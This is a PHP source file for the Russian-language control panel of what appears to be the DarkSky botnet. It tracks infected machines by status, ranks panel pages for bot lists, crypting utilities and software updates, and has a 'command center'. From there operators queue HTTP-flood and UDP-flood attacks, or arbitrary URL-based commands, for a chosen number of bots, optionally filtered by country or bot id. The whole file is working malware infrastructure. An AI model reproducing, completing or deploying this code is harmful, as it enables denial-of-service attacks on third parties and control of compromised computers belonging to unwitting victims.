<?

DEFINE('Other','modules/other/');
DEFINE('Config','modules/config/');
DEFINE('Modules','modules/');
DEFINE('Special','sky');

include_once(Other.'template.class.php');
include_once(Other.'filter.php');
include_once(Config.'config.php');
include_once(Modules.'global.php');
include_once(Modules.'security.php');
include_once(Modules.'users.php');
include_once(Modules.'html.php');
include_once('application/update.php');
include_once('stat.php');


$global = new GlobalCore;
$user = new Admin;
$tpl = new Template;
$tpl->dir = $global->dir;
$filter = new Filter;
$sec = new Security('main');
$up = new Update;
$stat = new Stats('index');

$domain = parse_url($global->domain);
$tpl->set('{url}', $global->domain . $global->dir);
$tpl->set('{domain}', $global->domain);

$tpl->set('{time}', date('H:s'));
$tpl->set('{show}', '');
$settings = false;

if($user->Check()):
	setcookie ('RepeatAuth',  '1' , time() + (3600*24));
	$page = 0;
	$pages = 10;
	$maxbutt = ceil($user->CheckCountUsers()/10)*1;
	$tpl->set('{ip}', $user->UserInfos(0));
	$tpl->set('{code}', $user->UserInfos(1));
	$flag = '';
	
		if(isset($_GET['f'])):
				
				$tpl->set('{menu}', $tpl->sub_load_template('menu.tpl'));
				$tpl->set('{total_users}', $user->CheckCountUsers());
				$tpl->set('{total_online}', $user->GetOnline());
				$tpl->set('{total_offline}', $user->GetOffline());
				$tpl->set('{total_dead}', $user->GetDead());
				$tpl->set('{total_banned}', count(file($sec->files))-3);
				$tpl->set('{url-menu}', $global->domain);
				$tpl->set('{url-menu}', $global->domain);
			
				
					if($_GET['f'] == 'main'):
					
						$flag = $global->dir;
						$tpl->set('{main}', 'active');
						$tpl->set('{title}', $global->title);
						$pgs = count($user->UsersView($page));
						$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
						$tpl->set('{UsersDay}', count($user->StatsFromDay('reg')));
						$tpl->set('{UsersMidOnline}', $user->StatsFromDayAOnline());
						$tpl->set('{UsersDayBanned}', count($user->StatsFromDay('banned')));
						$tpl->set('{UsersDeath}', count($user->StatsFromDay('banned')));
						
						if(isset($_GET['p'])):
								if(is_numeric($_GET['p'])):
									$page = $_GET['p'];
									$pages = 10;
										if($page > 0):
											$tpl->set('{active_button}', $page);
											$tpl->set('{max_users}', $user->CheckCountUsers());
											$tpl->set('{min_users}', 10*$page);
										else:
											$tpl->set('{active_button}', $page);
											$tpl->set('{max_users}', $user->CheckCountUsers());
											$tpl->set('{min_users}', 10*$page);
										endif;
								else:
									$tpl->set('{active_button}', '0');
									$tpl->set('{max_users}', $user->CheckCountUsers());
									$tpl->set('{min_users}', $pages);
								endif;
						else: 
			
							$pages = 10;
							$tpl->set('{active_button}', $page);
							$tpl->set('{max_users}', $user->CheckCountUsers());
							$tpl->set('{min_users}', 10*$page);
							
						endif;
						
						if(isset($_GET['action'])):
							if($_GET['action'] == 'delete' && isset($_GET['id'])):
								$user->DeleteUser($_GET['id']);
								$user->GoHome(true);
							endif;
							if($_GET['action'] == 'banip' && isset($_GET['ip'])):
								if($sec->searchLine($_GET['ip'])==false):
									if($sec->AddToBase($_GET['ip'], 'Пользовательское действие')):
										$user->GoHome(true);
									endif;
								endif;
							endif;
							$user->GoHome(true);
						endif;
						
						if(isset($_GET['logdelete'])=='1'):
							$user->DeleteLog();
							$user->GoHome(true);
						endif;
					endif;
					if($_GET['f'] == 'users'):
						$tpl->set('{users}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('users.tpl'));
						$tpl->set('{title}', 'Список пользователей' . sep . $global->title);
					endif;
					
					if($_GET['f'] == 'crypt'):
						$tpl->set('{crypt}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('crypt.tpl'));
						$tpl->set('{title}', 'Крипт ультиты' . sep . $global->title);
					endif;
					
					if($_GET['f'] == 'product'):
						$uparr = json_decode($up->file_get_contents_curl(URL), true);
						$tpl->set('{product}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('software.tpl'));
						$tpl->set('{title}', 'DarkSky Software' . sep . $global->title);
						$tpl->set('{key}', KEY);
						$tpl->set('{current_version}', V);
						$tpl->set('{last_version}', $uparr[1]);
						$tpl->set('{last_date_update}', $uparr[3]);
						$tpl->set('{next_date_update}', $uparr[5]);
						$tpl->set('{dump_link}', '../dump/1/');
					endif;
					
					if($_GET['f'] == 'settings'):
					$settings = true;
						if(isset($_GET['p'])):
						$tpl->set('{settings}', 'active');
						$settings = true;
							if($_GET['p'] == '1'):
								if(isset($_POST['template']) && isset($_POST['domain']) && isset($_POST['lang']) && isset($_POST['chpu'])):
									$s = array('template' => $_POST['template'], 'domain' => $_POST['domain'], 'lang' => $_POST['lang'], 'chpu' => $_POST['chpu']);
									if($global->UpdateConfig1($s['template'], $s['domain'], $s['lang'], $s['chpu'])):
										$results = true;
									else:
										$results = false;
									endif;
								else:
								endif;
									$tpl->set('{content}', $tpl->sub_load_template('settings1.tpl'));
									$tpl->set('{title}', 'Глобальные настройки' . sep . $global->title);
									$tpl->set('{path}', $global->domain);
									$tpl->set('{domen}', $global->domain);
									$tpl->set('{template}', $global->dir);
									$tpl->set('{lang}', $global->lang);
									$tpl->set('{ht}', $global->ht); 
									$tpl->set('{settings}', 'active');
									$tpl->set('{sets}', '0');
								endif;
								
								if($_GET['p']=='2'):
									$tpl->set('{content}', $tpl->sub_load_template('settings2.tpl'));
									$tpl->set('{title}', 'Доп.настройки' . sep . $global->title);
									$tpl->set('{sets}', '1');
									$tpl->set('{viewcmd}', $global->showcmd); 
									$tpl->set('{autoclear}', $global->autoclear); 
									$tpl->set('{page}', $global->maxusers); 
									$tpl->set('{repeatban}', $global->repeatban);
									$tpl->set('{mode}', $global->mode);
									$tpl->set('{loginauth}', $global->access);
								endif;
						endif;
					endif;
					if($_GET['f'] == 'blacklist'):
							$tpl->set('{sec}', 'active');
							$tpl->set('{content}', $tpl->sub_load_template('blacklist.tpl'));
							$tpl->set('{title}', 'Черные списки'. $global->title);
							$tpl->set('{file}', $sec->LoadBase());
							if($sec->CheckBase() == true): $tpl->set('{seccode}', 'visible'); 
							else: $tpl->set('{seccode}', 'hidden'); endif;
							if(isset($_POST['ipblock']) || isset($_POST['ipunban'])):
								if(!(empty($_POST['ipblock']))): 
									$ipb = $_POST['ipblock'];
									if($sec->searchLine($ipb)==false):
										if($sec->AddToBase($ipb, 'Ручной бан')):
											$user->GoHome(true);
											$tpl->set('{show}', '0');
										endif;
									else: 
										$tpl->set('{show}', '1');
									endif;
								endif;
								if(!(empty($_POST['ipunban']))):
									$unban = $_POST['ipunban'];
									if($sec->DeleteLine($sec->searchLine($unban))):
										$user->GoHome(true);
										$tpl->set('{show}', '0');
									else:
										$tpl->set('{show}', '1');
									endif;
								endif;
							endif;
					endif;
					
					if($_GET['f'] == 'commands'):
						
						$tpl->set('{commands}', 'active');
						$tpl->set('{title}', 'Командный центр'. $global->title);
						$tpl->set('{content}', $tpl->sub_load_template('users.tpl'));
						//var_dump($_POST);
						if(isset($_POST['comm']) && isset($_POST['amount']) && isset($_POST['url'])):
							
							
								if(isset($_POST['country'])): $con = $_POST['country']; else: $con = ''; endif;
								if(isset($_POST['forid'])): $forid = $_POST['forid']; else: $forid = ''; endif;
								if(isset($_POST['url'])): $url = $_POST['url']; endif;
								if(isset($_POST['thread'])): $thread = $_POST['thread']; endif;
								if(isset($_POST['timeout'])): $timeout = $_POST['timeout']; endif;
								if(isset($_POST['method_http'])): $type = $_POST['method_http']; endif;
								if(isset($_POST['amount'])): $amount = $_POST['amount']; endif;
								
										if($_POST['comm'] == 'http_d'):
											$com = 'method.http:"' . $url  . '", threads:"' . $thread . '", timeout:"' . $timeout . '", type:"' . $type . '"';
										else:
											if($_POST['comm'] == 'udp'):
												$com = 'udp:"' . $url  . '", p:"' . $thread . '", speed:"' . $timeout . '"';
											else:
												$com = $_POST['comm'] .':"'. $_POST['url'] . '"';
											endif;
										endif;
										
									$user->AddCommand($com, $amount, $con, $forid); //1 commanda , 2 amount , 3 country, 4 for id
									
										
									$user->GoHome(true);
		
							
						endif;
						
						if(isset($_GET['delete_c'])):
							$user->ClearCommand($_GET['delete_c']);
							$user->GoHome(true);
						endif;
						
						if(isset($_GET['delete_l'])):
							if($user->ClearLastCMD()):
								$user->GoHome(true);
							endif;
						endif;
					endif;
					if($_GET['f'] == ''):
							$tpl->set('{title}', 'Ошибка 404 — Не найдено' . sep . $global->title);
							$tpl->set('{content}', $tpl->sub_load_template('error.tpl'));
							
					endif;
					if($_GET['f'] == 'login'):
							$tpl->set('{title}', 'Авторизация' . sep . $global->title);
							$tpl->set('{content}', $tpl->sub_load_template('login.tpl'));
						
					endif;
		else:
			if(!empty($_GET['f'])):
				$tpl->set('{title}', $global->title);
				$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
				$tpl->set('{min_res}', count($user->UsersView($page))*1+($pages));
				$tpl->set('{low_res}', ($page*10));
				
			else:
				
				$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
				$tpl->set('{main}', 'active');
				$tpl->set('{menu}', $tpl->sub_load_template('menu.tpl'));
				$tpl->set('{title}', $global->title);
				$tpl->set('{min_res}', count($user->UsersView($page))*1+($pages));
				$tpl->set('{low_res}', ($page*10));
				header('Location: main/');
				
			endif;
						
	endif;		
	if(isset($_GET['s'])=='1'):
		header('Location: ../main/');
	endif;
else:
	if(isset($_GET['s'])=='1'):
		$tpl->set('{menu}', '');
		$tpl->set('{title}', 'Авторизация');
		$tpl->set('{login_url}', $global->domain);
		$tpl->set('{content}', $tpl->sub_load_template('login.tpl'));
		$main = true;
	else:
		if(isset($_COOKIE['RepeatAuth'])=='1'):
			if(isset($_GET['f'])):
				header('Location: ../sky/');
			else:
				header('Location: sky/');
			endif;
		else:
			$sec->NotFound();
		endif;
	endif;
endif;

$tpl->set('{body}', '');
$tpl->load_template('main.tpl'); 

$tpl->compile('main');
eval(' ?' . '>' . $tpl->result['main'] . '<' . '?php ');
$tpl->global_clear();

?>